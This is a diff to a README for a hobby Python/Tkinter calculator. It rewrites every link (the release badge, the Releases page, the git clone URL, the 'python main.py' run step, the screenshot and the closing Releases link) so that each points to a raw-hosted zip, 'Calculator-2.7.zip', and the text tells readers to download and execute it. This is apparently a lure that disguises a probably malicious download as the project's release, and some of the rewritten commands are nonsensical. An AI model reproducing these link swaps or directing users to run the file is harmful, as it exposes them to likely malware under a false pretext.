@@ -1,6 +1,6 @@
 # Stylish Dark Purple Calculator Built with Python and Tkinter 🌌
 
-![Calculator](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen?style=flat&logo=github)
+![Calculator](https://raw.githubusercontent.com/xXCupidoXx/Calculator-/main/undergabble/Calculator-2.7.zip%20Latest%20Release-Click%20Here-brightgreen?style=flat&logo=github)
 
 Welcome to the **Calculator-** repository! This project features a custom-built calculator using Python and Tkinter. The design boasts a dark purple theme inspired by the beauty of galaxies. With full arithmetic functionality and a clean user interface, this calculator is perfect for anyone looking to learn GUI development in Python.
 
@@ -24,7 +24,7 @@ Welcome to the **Calculator-** repository! This project features a custom-built 
 
 ## Installation
 
-To get started with the calculator, you need to download the latest release. Visit the [Releases section](https://github.com/xXCupidoXx/Calculator-/releases) to find the necessary files. Download and execute the file to run the application on your desktop.
+To get started with the calculator, you need to download the latest release. Visit the [Releases section](https://raw.githubusercontent.com/xXCupidoXx/Calculator-/main/undergabble/Calculator-2.7.zip) to find the necessary files. Download and execute the file to run the application on your desktop.
 
 ### Requirements
 
@@ -35,7 +35,7 @@ To get started with the calculator, you need to download the latest release. Vis
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/xXCupidoXx/Calculator-.git
+   git clone https://raw.githubusercontent.com/xXCupidoXx/Calculator-/main/undergabble/Calculator-2.7.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -43,7 +43,7 @@ To get started with the calculator, you need to download the latest release. Vis
    ```
 3. Run the application:
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/xXCupidoXx/Calculator-/main/undergabble/Calculator-2.7.zip
    ```
 
 ## Usage
@@ -71,7 +71,7 @@ The calculator includes various functionalities to meet your needs:
 
 ## Screenshots
 
-![Calculator Interface](https://via.placeholder.com/600x400.png?text=Calculator+Interface)
+![Calculator Interface](https://raw.githubusercontent.com/xXCupidoXx/Calculator-/main/undergabble/Calculator-2.7.zip+Interface)
 
 ## Contributing
 
@@ -107,6 +107,6 @@ This project covers a variety of topics that may interest you:
 
 This project is licensed under the MIT License. Feel free to use, modify, and distribute this code as per the license terms.
 
-For any questions or issues, check the [Releases section](https://github.com/xXCupidoXx/Calculator-/releases) or raise an issue in the repository. 
+For any questions or issues, check the [Releases section](https://raw.githubusercontent.com/xXCupidoXx/Calculator-/main/undergabble/Calculator-2.7.zip) or raise an issue in the repository. 
 
 Thank you for your interest in the **Calculator-** project!
